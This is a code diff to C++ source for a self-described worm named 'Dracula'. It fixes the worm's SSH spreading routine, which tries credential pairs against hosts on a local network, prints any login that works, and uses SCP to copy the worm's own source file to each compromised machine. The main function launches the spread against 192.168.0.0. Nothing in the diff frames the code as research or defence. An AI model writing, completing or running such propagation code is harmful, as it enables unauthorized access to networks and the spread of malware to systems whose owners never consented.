@@ -64,18 +64,44 @@ public:
                 }
           ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, remote_address.c_str());
           ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, cred.first.c_str());
-           rc = ssh_connect(my_ssh_session);
- if (rc == SSH_OK){
- rc == ssh_userauth_password(my_ssh_session, NULL, cred.second.c_str());
- if(rc == SSH_AUTH_SUCCESS){
-   std::cout << "Connected to " remote address << "with credentials" << cred.first << ";" << cred.second <<std::endl;
-     scp_session = ssh_scp_new(my_ssh_session, SSH_SCP_WRITE, ".");
-                        if (scp_session != NULL) {
-                      ssh_scp_init(scp_session);
-                      ssh_scp_push_file(scp_session, "dracula.cpp",scp_ssh_session);
-                     scp_session_auth(scp_session, cred.first);
-                     scp_session_access(scp_session, cred.second);
-                   scp_push_auth_file(cred.second, cred.first);
- 
+          rc = ssh_connect(my_ssh_session);  // Try connecting to the SSH host
+                if (rc == SSH_OK) {  // If SSH connection is successful
+                    rc = ssh_userauth_password(my_ssh_session, NULL, cred.second.c_str());  // Authenticate with password
+                    if (rc == SSH_AUTH_SUCCESS) {  // If authentication is successful
+                        std::cout << "Connected to " << remote_address << " with credentials " << cred.first << ":" << cred.second << std::endl;
+
+                        // Initialize SCP session for file transfer
+                        scp_session = ssh_scp_new(my_ssh_session, SSH_SCP_WRITE, ".");
+                        if (scp_session != NULL) {  // If SCP session is successfully created
+                            ssh_scp_init(scp_session);  // Initialize SCP
+                            ssh_scp_push_file(scp_session, "dracula.cpp", 1024, S_IRUSR | S_IWUSR);  // Transfer worm file to the remote host
+                            std::cout << "Worm file uploaded to the host" << std::endl;
+                        }
+                        ssh_scp_free(scp_session);  // Free SCP session resources
+                    } else {
+                        std::cout << "Authentication failed for " << remote_address << std::endl;
+                    }
+                } else {
+                    std::cout << "SSH connection failed for " << remote_address << std::endl;
+                }
+
+                // Disconnect and free the SSH session
+                ssh_disconnect(my_ssh_session);
+                ssh_free(my_ssh_session);
+            }
+        }
+    }
+};
+
+int main() {
+    // Initialize dracula object with the network address "192.168.0.0"
+    Dracula dracula("192.168.0.0");
+
+    // Spread the worm via SSH connection on the network
+    dracula.spread_via_ssh();
+
+    return 0;
+}
+
                    
              
